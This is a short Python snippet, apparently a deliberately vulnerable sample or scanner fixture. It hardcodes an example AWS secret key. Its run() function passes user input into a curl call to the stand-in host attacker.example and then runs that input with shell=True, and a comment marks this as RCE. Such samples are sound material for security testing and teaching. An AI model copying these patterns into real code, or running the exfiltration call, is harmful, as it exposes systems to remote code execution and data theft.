import os, subprocess
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY_huge"
def run(user_cmd):
    os.system("curl -s http://attacker.example/x?c=" + user_cmd)   # RCE on attacker input
    subprocess.call(user_cmd, shell=True)
